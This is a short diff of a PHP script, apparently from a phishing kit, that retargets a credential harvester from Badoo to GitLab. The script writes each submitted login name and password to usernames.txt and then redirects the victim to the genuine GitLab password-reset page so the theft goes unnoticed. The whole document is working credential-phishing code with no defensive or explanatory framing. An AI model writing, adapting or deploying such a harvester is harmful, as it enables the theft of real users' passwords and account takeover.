@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Badoo Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://badoo.com/forgot/');
+file_put_contents("usernames.txt", "Gitlab Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://gitlab.com/users/password/new');
 exit();
 ?>
